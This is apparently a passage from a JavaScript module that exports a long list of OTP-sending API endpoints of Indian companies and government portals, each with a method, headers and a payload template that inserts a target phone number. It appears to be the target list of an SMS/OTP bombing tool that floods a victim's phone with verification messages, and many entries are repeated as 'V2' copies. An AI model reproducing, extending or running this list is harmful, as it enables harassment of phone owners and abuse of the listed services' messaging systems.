  { name: "LendingPlate Full", url: "https://lendingplate.com/api.php", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, data: (p) => `mobiles=${p}&resend=Resend` },
  { name: "ShipRocket Full", url: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },
  { name: "WorkIndia Full", url: "https://api.workindia.in/api/candidate/profile/login/verify-number/", method: "GET", headers: {}, data: null },
  { name: "Vyapar Full", url: "https://vyaparapp.in/api/ftu/v3/send/otp", method: "GET", headers: {}, data: null },
  { name: "Kredily Full", url: "https://app.kredily.com/ws/v1/accounts/send-otp/", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Tata Motors Full", url: "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, sendOtp: "true"}) },
  { name: "MyGov Full", url: "https://auth.mygov.in/regapi/register_api_ver1/", method: "GET", headers: {}, data: null },
  { name: "TrulyMadly Full", url: "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, locale: "IN"}) },
  { name: "Apna Full", url: "https://production.apna.co/api/userprofile/v1/otp/", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, hash_type: "play_store"}) },
  { name: "CodFirm Full", url: "https://api.codfirm.in/api/customers/login/otp", method: "GET", headers: {}, data: null },
  { name: "Swipe Full", url: "https://app.getswipe.in/api/user/mobile_login", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, resend: true}) },
  { name: "More Retail Full", url: "https://omni-api.moreretail.in/api/v1/login/", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, hash_key: "XfsoCeXADQA"}) },
  { name: "Country Delight Full", url: "https://api.countrydelight.in/api/v1/customer/requestOtp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, platform: "Android", mode: "new_user"}) },
  { name: "AstroSage Full V2", url: "https://vartaapi.astrosage.com/sdk/registerAS", method: "GET", headers: {}, data: null },
  { name: "Rapido Full", url: "https://customer.rapido.bike/api/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "TooToo Full", url: "https://tootoo.in/graphql", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({query: `query sendOtp($mobile_no: String!, $resend: Int!) { sendOtp(mobile_no: $mobile_no, resend: $resend) { success __typename } }`, variables: {mobile_no: p, resend: 0}}) },
  { name: "ConfirmTkt Full", url: "https://securedapi.confirmtkt.com/api/platform/registerOutput", method: "GET", headers: {}, data: null },
  { name: "BetterHalf Full", url: "https://api.betterhalf.ai/v2/auth/otp/send/", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, isd_code: "91"}) },
  { name: "Charzer Full", url: "https://api.charzer.com/auth-service/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, appSource: "CHARZER_APP"}) },
  { name: "Nuvama Wealth Full", url: "https://nma.nuvamawealth.com/edelmw-content/content/otp/register", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNo: p, emailID: "test@example.com"}) },
  { name: "Mpokket Full", url: "https://web-api.mpokket.in/registration/sendOtp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Home Delivery Full", url: "https://homedeliverybackend.mpaani.com/auth/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone_number: p, role: "CUSTOMER"}) },
  { name: "MyHubble Money Full", url: "https://api.myhubble.money/v1/auth/otp/generate", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phoneNumber: p, channel: "SMS"}) },
  { name: "Tata Capital Business Full", url: "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p, deviceOs: "Android", sourceName: "MitayeFaasleWebsite"}) },
  { name: "DealShare Full", url: "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, hashCode: "k387IsBaTmn"}) },
  { name: "Snapmint Full", url: "https://api.snapmint.com/v1/public/sign_up", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Housing.com Full", url: "https://login.housing.com/api/v2/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p, country_url_name: "in"}) },
  { name: "RentoMojo Full", url: "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Khatabook Full V2", url: "https://api.khatabook.com/v1/auth/request-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p, app_signature: "wk+avHrHZf2"}) },
  { name: "Netmeds Full", url: "https://apiv2.netmeds.com/mst/rest/v1/id/details/", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Nykaa Full", url: "https://www.nykaa.com/app-api/index.php/customer/send_otp", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, data: (p) => `source=sms&app_version=3.0.9&mobile_number=${p}&platform=ANDROID&domain=nykaa` },
  { name: "RummyCircle Full V3", url: "https://www.rummycircle.com/api/fl/auth/v3/getOtp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, isPlaycircle: false}) },
  { name: "Animall Full", url: "https://animall.in/zap/auth/login", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p, signupPlatform: "NATIVE_ANDROID"}) },
  { name: "PenPencil V3 Full", url: "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Entri Full", url: "https://entri.app/api/v3/users/check-phone/", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Cosmofeed Full V2", url: "https://prod.api.cosmofeed.com/api/user/authenticate", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p, version: "1.4.28"}) },
  { name: "Revv Full", url: "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, deviceType: "website"}) },
  { name: "DeHaat Full V2", url: "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, client_id: "kisan-app"}) },
  { name: "A23 Games Full", url: "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, device_id: "android123", model: "Google,Android SDK built for x86,10"}) },
  { name: "Spencer's Full", url: "https://jiffy.spencers.in/user/auth/otp/send", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "PayMe India Full", url: "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p, app_signature: "S10ePIIrbH3"}) },
  { name: "Shopper's Stop Full", url: "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, type: "SIGNIN_WITH_MOBILE"}) },
  { name: "Hyuga Auth Full", url: "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "BigCash Full", url: "https://www.bigcash.live/sendsms.php", method: "GET", headers: {"Referer": "https://www.bigcash.live/games/poker"}, data: null },
  { name: "Lifestyle Stores Full", url: "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({signInMobile: p, channel: "sms"}) },
  { name: "PokerBaazi Full", url: "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, mfa_channels: "phno"}) },
  { name: "My11Circle Full V3", url: "https://www.my11circle.com/api/fl/auth/v3/getOtp", method: "POST", headers: {"Content-Type": "application/json;charset=UTF-8"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "MamaEarth Full V2", url: "https://auth.mamaearth.in/v1/auth/initiate-signup", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "HomeTriangle Full", url: "https://hometriangle.com/api/partner/xauth/signup/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Wellness Forever Full", url: "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer", method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, data: (p) => `method=firstRegisterApi&data={"customerMobile":"${p}","generateOtp":"true"}` },
  { name: "HealthMug Full", url: "https://api.healthmug.com/account/createotp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Vyapar Full V2", url: "https://vyaparapp.in/api/ftu/v3/send/otp", method: "GET", headers: {}, data: null },
  { name: "Kredily Full V2", url: "https://app.kredily.com/ws/v1/accounts/send-otp/", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Tata Motors Full V2", url: "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, sendOtp: "true"}) },
  { name: "Moglix Full V2", url: "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, buildVersion: "24.0"}) },
  { name: "MyGov Full V2", url: "https://auth.mygov.in/regapi/register_api_ver1/", method: "GET", headers: {}, data: null },
  { name: "TrulyMadly Full V2", url: "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, locale: "IN"}) },
  { name: "Apna Full V2", url: "https://production.apna.co/api/userprofile/v1/otp/", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, hash_type: "play_store"}) },
  { name: "CodFirm Full V2", url: "https://api.codfirm.in/api/customers/login/otp", method: "GET", headers: {}, data: null },
  { name: "Swipe Full V2", url: "https://app.getswipe.in/api/user/mobile_login", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, resend: true}) },
  { name: "More Retail Full V2", url: "https://omni-api.moreretail.in/api/v1/login/", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, hash_key: "XfsoCeXADQA"}) },
  { name: "Country Delight Full V2", url: "https://api.countrydelight.in/api/v1/customer/requestOtp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, platform: "Android", mode: "new_user"}) },
  { name: "AstroSage Full V3", url: "https://vartaapi.astrosage.com/sdk/registerAS", method: "GET", headers: {}, data: null },
  { name: "Rapido Full V2", url: "https://customer.rapido.bike/api/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "TooToo Full V2", url: "https://tootoo.in/graphql", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({query: `query sendOtp($mobile_no: String!, $resend: Int!) { sendOtp(mobile_no: $mobile_no, resend: $resend) { success __typename } }`, variables: {mobile_no: p, resend: 0}}) },
  { name: "ConfirmTkt Full V2", url: "https://securedapi.confirmtkt.com/api/platform/registerOutput", method: "GET", headers: {}, data: null },
  { name: "BetterHalf Full V2", url: "https://api.betterhalf.ai/v2/auth/otp/send/", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, isd_code: "91"}) },
  { name: "Charzer Full V2", url: "https://api.charzer.com/auth-service/send-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p, appSource: "CHARZER_APP"}) },
  { name: "Nuvama Wealth Full V2", url: "https://nma.nuvamawealth.com/edelmw-content/content/otp/register", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNo: p, emailID: "test@example.com"}) },
  { name: "Mpokket Full V2", url: "https://web-api.mpokket.in/registration/sendOtp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
];

module.exports = APIS;